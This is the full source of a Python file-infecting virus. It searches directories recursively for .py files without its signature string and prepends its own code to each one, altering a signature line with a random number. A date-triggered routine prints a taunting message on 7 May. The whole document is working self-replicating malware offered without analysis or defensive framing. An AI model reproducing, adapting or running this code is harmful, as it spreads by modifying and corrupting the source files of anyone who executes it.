#!/usr/bin/python
import os
import datetime
import random

SIGNATURE = "SIMPLE PYTHON VIRUS"
SIGNA = "SIMPLE PYTHON "
def search(path):
    filestoinfect = []
    filelist = os.listdir(path)
    for fname in filelist:
        if os.path.isdir(path+"/"+fname):
            filestoinfect.extend(search(path+"/"+fname))
        elif fname[-3:] == ".py":
            infected = False
            for line in open(path+"/"+fname):
                if SIGNA in line:
                    infected = True
                    break
            if infected == False:
                filestoinfect.append(path+"/"+fname)
    return filestoinfect
def infect(filestoinfect):
    for fname in filestoinfect:
        virus = open(os.path.abspath(__file__))
        virusstring = ""
        for i,line in enumerate(virus):
            if i >= 0 and i < 44:
                if i == 5:
                    line = line[:27] + str(random.randint(1,25)) + " VIRUS\"\n" 
                    print("VIRUs String " + line)
                virusstring += line
        virus.close
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname,"w")
        f.write(virusstring + temp)
        f.close()
def bomb():
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 7:
        print ("HAHA YOU ARE AFFECTED BY VIRUS!! AND THAT'S AN EVIL ALUGH BY THE WAY!!")
filestoinfect = search(os.path.abspath(""))
infect(filestoinfect)
bomb()